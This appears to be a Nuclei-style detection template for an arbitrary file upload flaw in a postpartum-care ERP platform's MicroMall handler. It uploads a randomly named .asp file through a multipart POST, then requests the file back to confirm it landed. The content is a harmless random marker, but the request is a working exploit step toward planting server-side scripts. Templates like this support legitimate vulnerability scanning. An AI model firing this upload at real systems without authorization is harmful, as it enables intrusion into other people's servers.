id: poc-yaml-jintongfang-erp-micromall-anyfile-upload
info:
  name: 月子会所ERP管理云平台 MicroMall 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_base(5)}}"
  t2: "{{base64(t1)}}"

flow: http(1) && http(2)

http:
  - id: file-upload
    method: POST
    path:
      - "/Page/MicroMall/ashx/Handler.ashx"
    headers:
      Content-Type: multipart/form-data; boundary=00content0boundary00
    body: |-
      --00content0boundary00
      Content-Disposition: form-data; name="file"; filename="{{t1}}.asp"

      {{t2}}
      --00content0boundary00--
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ".asp"
    extractors:
      - type: regex
        name: file
        internal: true
        group: 1
        regex:
          - "(.*)\\.asp"

  - id: verify-upload
    method: GET
    path:
      - "/UploadBaseFolder/Supplier/{{file}}.asp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
